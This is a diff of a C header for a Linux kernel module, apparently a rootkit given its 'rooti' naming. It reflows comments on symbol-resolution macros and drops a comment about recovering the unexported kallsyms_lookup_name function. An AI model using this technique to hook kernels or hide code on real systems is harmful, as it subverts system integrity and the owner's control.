@@ -23,27 +23,22 @@ if (__##symbol == NULL) {                                               \
 }
 
 /*
-    Just like the macro above but specifically for function pointers. The function signature is typedef'ed
-    as <symbol>_t and is constructed by:  'return_type' and the following variable number of args which
-    specify the argument types in order. 
+    Just like the macro above but specifically for function pointers. The function signature is
+    typedef'ed as <symbol>_t and is constructed by: 'return_type' and the following variable number
+    of args which specify the argument types in order. 
 */
 #define ROOTI_RESOLVE_FUNC_ADDR(symbol, error_value, return_type, ...)  \
 typedef return_type (*symbol##_t)(__VA_ARGS__);                         \
 ROOTI_RESOLVE_SYM_ADDR(symbol##_t, symbol, error_value)
 
 /*
-    Unfortunately the linux kernel ARRAY_SIZE macro cannot be used to assign the result of the calculation
-    to a constant variable because the linux macro includes some magic __must_be_array() term to catch invalid use
-    of the macro, thus making the expression not constant.
+    Unfortunately the linux kernel ARRAY_SIZE macro cannot be used to assign the result of the
+    calculation to a constant variable because the linux macro includes some magic __must_be_array()
+    term to catch invalid use of the macro, thus making the expression not constant.
 */
 #define CONST_ARRAY_SIZE(ARR) sizeof(ARR) / sizeof(ARR[0])
 #define DECLARE_ARRAY_SIZE(ARR) const size_t ARR##_COUNT = CONST_ARRAY_SIZE(ARR)
 
-/*
-    Reference to the kallsyms_lookup_name() kernel function which is no longer exported. 
-    The address of this function pointer should be filled in during initialization
-    by rooti_resolve_kln_addr();
-*/
 extern unsigned long (*__kallsyms_lookup_name)(const char *name);
 
 int rooti_resolve_kln_addr(void);
